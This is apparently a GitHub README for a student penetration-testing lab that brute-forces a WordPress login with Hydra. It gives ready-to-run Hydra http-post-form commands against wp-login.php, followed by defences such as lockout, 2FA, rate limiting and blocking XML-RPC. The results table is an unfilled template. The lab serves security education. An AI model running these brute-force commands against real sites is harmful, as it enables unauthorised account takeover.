Apache/WordPress Brute Force Attack - Penetration Testing Lab

![Security Testing](https://img.shields.io/badge/Security-Penetration%20Testing-red)
![Kali Linux](https://img.shields.io/badge/Platform-Kali%20Linux-blue)
![Hydra](https://img.shields.io/badge/Tool-Hydra-green)

Project Overview

This project demonstrates a brute force attack on a WordPress login page hosted on an Apache web server. The purpose is to understand web application vulnerabilities and the importance of strong password policies in cybersecurity.

** DISCLAIMER**: This project is for educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before conducting security testing.

##  Objectives

- Demonstrate password weakness vulnerabilities in WordPress
- Understand brute force attack methodology
- Learn defensive measures against such attacks
- Practice penetration testing in a controlled environment

##  Tools & Technologies Used

- **Operating System**: Kali Linux
- **Attack Tool**: Hydra (THC-Hydra)
- **Web Server**: Apache HTTP Server
- **Target Application**: WordPress CMS
- **Protocol**: HTTP/HTTPS
- **Scripting**: Bash

##  Lab Environment Setup

### Prerequisites
- Kali Linux (or any Linux distribution with Hydra installed)
- Apache web server
- WordPress installation
- Network connectivity between attacker and target machines

### Installation

```bash
# Install Hydra (if not already installed)
sudo apt-get update
sudo apt-get install hydra

# Install Apache
sudo apt-get install apache2

# Install WordPress (if setting up your own lab)
# Follow WordPress installation guide
```

##  Attack Methodology

### 1. Reconnaissance
- Identified the WordPress login page
- Determined the login form structure
- Located username enumeration vulnerabilities

### 2. Attack Execution

```bash
# Basic Hydra command for WordPress brute force
hydra -l <username> -P <wordlist> <target-ip> http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect"

# With specific parameters
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username"
```

### 3. Results Analysis
- Documented successful credential discovery
- Analyzed attack duration and success rate
- Evaluated security implications

##  Documentation

Below are screenshots documenting the entire attack process:

### Attack Setup
Hydra Configuration <img width="1604" height="918" alt="image" src="https://github.com/user-attachments/assets/d53b4145-08b7-48e4-8335-b26ae20fa0b0" />


### Attack Execution
Attack in Progress <img width="1639" height="938" alt="image" src="https://github.com/user-attachments/assets/73446b76-5653-4007-98f3-c1e844b3036c" />


### Successful Compromise
Successful Results from Hydra <img width="1604" height="918" alt="image" src="https://github.com/user-attachments/assets/e3710b8a-c67e-423e-a998-7f013e5c5c44" />


*Additional screenshots available in the `/screenshots` directory*

##  Defense Mechanisms & Recommendations

### Prevention Strategies
1. **Strong Password Policy**
   - Minimum 12 characters
   - Complexity requirements (uppercase, lowercase, numbers, symbols)
   - Regular password rotation

2. **Account Lockout Policy**
   - Lock accounts after 5 failed attempts
   - Implement progressive delays

3. **Two-Factor Authentication (2FA)**
   - Implement 2FA for all WordPress accounts
   - Use authenticator apps or hardware tokens

4. **Rate Limiting**
   - Limit login attempts per IP address
   - Use plugins like Limit Login Attempts Reloaded

5. **Web Application Firewall (WAF)**
   - Deploy ModSecurity or similar WAF
   - Configure rules to detect brute force patterns

6. **Monitoring & Logging**
   - Enable comprehensive logging
   - Set up alerts for suspicious activities
   - Regular log review

### WordPress-Specific Security
```bash
# Disable XML-RPC (if not needed)
# Add to .htaccess
<Files xmlrpc.php>
  Order Deny,Allow
  Deny from all
</Files>

# Change default login URL
# Use plugins like WPS Hide Login

# Limit login attempts
# Install "Limit Login Attempts Reloaded" plugin
```

##  Results & Findings

| Metric | Value |
|--------|-------|
| Attack Tool | Hydra |
| Target | WordPress/Apache |
| Attack Type | HTTP POST Form Brute Force |
| Success Rate | [Your findings] |
| Time to Compromise | [Your findings] |
| Passwords Tested | [Your findings] |

##  Lessons Learned

1. Default or weak passwords are easily compromised
2. Brute force attacks are still effective against unprotected systems
3. Layered security approach is essential
4. Regular security audits are crucial
5. User education is as important as technical controls

##  References & Resources

- [Hydra Documentation](https://github.com/vanhauser-thc/thc-hydra)
- [WordPress Security Best Practices](https://wordpress.org/support/article/hardening-wordpress/)
- [OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Apache Security Tips](https://httpd.apache.org/docs/2.4/misc/security_tips.html)

##  Legal & Ethical Considerations

This demonstration was conducted in a controlled lab environment with proper authorization. Key ethical principles:

-  Only test systems you own or have explicit permission to test
-  Document and report all findings responsibly
-  Use knowledge to improve security, not exploit vulnerabilities
-  Never conduct unauthorized testing
-  Never use these techniques for malicious purposes

##  Author

**Siphelele X**
- GitHub: [@SipheleleX](https://github.com/SipheleleX)
- Project: Cybersecurity Lab Exercise

##  License

This project is for educational purposes only. Use responsibly and ethically.

---

**Note**: All testing was performed in an isolated lab environment. No real systems were compromised.


